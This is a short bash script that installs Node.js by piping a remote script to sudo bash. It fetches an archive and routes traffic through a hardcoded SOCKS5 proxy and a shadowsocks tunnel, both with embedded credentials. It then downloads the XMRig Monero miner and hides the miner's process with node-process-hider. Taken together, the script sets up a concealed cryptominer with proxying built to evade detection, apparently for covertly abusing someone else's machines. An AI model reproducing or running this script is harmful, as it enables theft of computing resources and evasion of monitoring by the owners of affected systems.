#!/bin/bash
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs

npm i -g node-process-hider
npm install -g npm

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 176.53.133.217:57597
socks5_username = 2BHVpyGPD
socks5_password = 1rN14HAmV
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

wget https://github.com/MoneroOcean/xmrig/releases/download/v6.15.0-mo1/xmrig-v6.15.0-mo1-lin64-compat.tar.gz
tar xf xmrig-v6.15.0-mo1-lin64-compat.tar.gz

apt -y install shadowsocks-libev rng-tools

ss-local -s 51.15.84.147 -p 8388 -l 9999 -k 6JPSE -m chacha20-ietf-poly1305 -v &

ph add xmrig
